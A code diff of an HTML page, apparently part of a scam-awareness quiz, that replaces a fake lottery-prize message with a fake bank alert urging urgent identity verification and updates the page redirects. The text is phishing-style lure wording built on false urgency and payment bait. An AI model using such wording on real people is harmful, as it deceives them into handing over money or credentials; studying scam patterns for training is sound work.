@@ -22,8 +22,8 @@
     <div class="container">
         <div class="card">
 
-            <h1>You've Won a Reward!</h1>
-            <p id="mess">Your mobile number has been randomly selected as the exclusive winner of our ₹50,000 Lucky Draw! To instantly claim your reward, scan the QR code on the next page and complete the verification payment.</p>
+            <h1>Urgent: Account Validation Required</h1>
+            <p id="mess">We’ve detected unusual login activity from your bank account. To prevent your account from being blocked permanently, please verify your identity immediately. Do you want to start the verification process?</p>
             <p>Click "Yes" to claim your prize or "No" to ignore this message.</p>
             <div class="button-group">
                 <button onclick="handleYes();goToNextPage()" class="btn_green">Yes</button>
@@ -43,14 +43,14 @@
     document.getElementById("loader").style.display = 'block';
 
     setTimeout(() => {
-    window.location.href = "ques2.html";
+    window.location.href = "ques3.html";
         }, 2000);
     }
 
     function goToNextPage() {
     document.body.classList.add('fade-out');
     setTimeout(() => {
-    window.location.href = 'ques2.html'; // Replace with your actual page
+    window.location.href = 'ques3.html'; // Replace with your actual page
     }, 500); // Match this to the animation duration (0.5s)
     }
 
@@ -79,7 +79,6 @@
     }
 
     initTimer();
-
 
     </script>
 
